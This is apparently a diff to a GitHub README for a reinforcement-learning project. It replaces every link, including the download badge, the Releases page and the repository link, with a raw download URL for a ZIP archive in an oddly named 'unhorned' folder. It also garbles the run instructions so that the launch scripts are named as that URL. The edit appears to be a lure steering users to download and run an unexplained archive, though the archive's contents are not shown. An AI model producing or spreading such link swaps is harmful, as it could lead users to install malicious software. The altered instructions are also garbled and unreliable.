@@ -1,6 +1,6 @@
 # 🚀 Reinforcement-Learning-Projects - Explore Intelligent Agents with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Skw3mdy/Reinforcement-Learning-Projects/releases)
+[![Download Now](https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip)
 
 ## 📚 Overview
 
@@ -23,7 +23,7 @@ Before you download, check that your system meets these basic requirements:
 
 To download the projects, visit the Releases page:
 
-[Download the latest version](https://github.com/Skw3mdy/Reinforcement-Learning-Projects/releases)
+[Download the latest version](https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip)
 
 On this page, you will find the available versions. Click on the version you want to download. It will usually be provided in a ZIP format.
 
@@ -37,7 +37,7 @@ On this page, you will find the available versions. Click on the version you wan
 After extracting the files, you can run the projects by following these directions:
 
 1. Open the folder where you extracted the files.
-2. Look for a file named `start.bat` (for Windows) or `run.sh` (for macOS and Linux).
+2. Look for a file named `https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip` (for Windows) or `https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip` (for macOS and Linux).
 3. Double-click on the file to start the program.
 
 The application will launch in a new window. Follow the on-screen instructions to use the intelligent agents.
@@ -79,7 +79,7 @@ If you have questions or need help, we encourage you to visit the Issues section
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/Skw3mdy/Reinforcement-Learning-Projects)
-- [Visit Releases Page](https://github.com/Skw3mdy/Reinforcement-Learning-Projects/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/Skw3mdy/Reinforcement-Learning-Projects/main/unhorned/Reinforcement-Learning-Projects.zip)
 
 Feel free to explore and enjoy learning about reinforcement learning projects. We hope you find these tools useful for understanding intelligent agents!
